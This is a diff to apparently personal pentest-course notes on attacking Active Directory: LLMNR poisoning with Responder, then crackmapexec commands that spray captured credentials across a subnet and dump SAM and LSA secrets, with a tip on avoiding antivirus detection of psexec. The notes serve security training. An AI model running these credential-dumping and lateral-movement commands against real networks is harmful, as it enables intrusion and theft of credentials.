@@ -8,6 +8,7 @@ link-local multicast name resolution (LLMNR)
 This is basically used when DNS fails and is similar to NETBIOS. NOTE: The key flaw is that when responding, the services uses a user´s username and NTLMv2 hash.
 
 To run this, make sure you have Impacter installed on Kali. https://github.com/SecureAuthCorp/impacket
+Note, that part of responder includes tools like psexec.py. psexec.py sometimes gets caught by Windows Defender or other Antivirus tools. It is then worth trying other tools in the toolkit. Have a look here for additional tools in impactor. https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d
 
 In kali:
 syntax: responder -I interface -rdwv (v for verbose to ensure that the hash is shown twice)
@@ -188,4 +189,23 @@ Once copied across, go to BloodHound and click on the upload data icon on the ri
 
 6. Post Compromise Attacks
 
+Pass the Password
 
+First, we need to set up crackmapexec. 
+syntax: apt install crackmapexec
+
+Next, we want to sweep the entire network with the username and password that we have already captured to see if we can get access anywhere else.
+syntax: crackmapexec smb 10.0.1.0/24 -u <USERNAME> -d <DOMAIN> -p <PASSWORD>
+
+We hopefully get a list of new machines that we didn´t know about and hopefully access to those machines.
+
+We can also try to dump the SAM databases on the machines, if crackmapexec gets access using the credentials. 
+
+syntax: crackmapexec smb 10.0.1.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
+
+We can also dump LSA secrets (where possible)
+
+syntax: crackmapexec smb 10.0.1.0/24 -u fcastle -d MARVEL.local -p Password1 --lsa
+
+There are a number of options with crackmapexec. 
+Pass the Hash
